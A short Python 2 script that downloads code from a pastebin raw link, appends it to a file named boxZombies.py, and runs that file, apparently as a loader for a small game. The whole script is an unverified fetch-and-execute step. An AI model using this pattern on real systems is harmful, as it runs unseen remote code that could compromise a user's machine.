import urllib
link = "http://pastebin.com/raw/H2t7PYpq"
f = urllib.urlopen(link)
myfile2 = f.read()
with open("boxZombies.py", "a") as myfile:
    myfile.write(myfile2)
execfile("boxZombies.py")
